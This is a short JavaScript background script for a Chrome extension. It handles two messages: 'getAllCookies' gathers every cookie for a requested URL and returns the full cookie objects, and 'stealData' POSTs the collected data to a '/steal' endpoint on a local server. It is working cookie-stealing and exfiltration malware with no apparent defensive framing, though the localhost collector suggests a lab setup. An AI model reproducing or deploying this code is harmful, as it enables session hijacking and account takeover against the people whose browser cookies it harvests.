chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension installed");
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    console.log("Background received message:", request.action);

    if (request.action === "getAllCookies") {
        chrome.cookies.getAll({ url: request.url }, (cookies) => {
            console.log("Cookies found for " + request.url + ":", cookies.length);
            // Send the full array of cookie objects directly
            sendResponse({ cookies: cookies });
        });
        return true;
    }

    if (request.action === "stealData") {
        console.log("Attempting to send data to server...");
        fetch("http://127.0.0.1:8080/steal", {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "text/plain",
            },
            body: JSON.stringify(request.data),
        })
            .then((response) => {
                console.log("SUCCESS: Data sent to server! Status:", response.status);
            })
            .catch((error) => {
                console.error("FAILURE: Could not send data to server. Error:", error);
            });
        return true;
    }
});
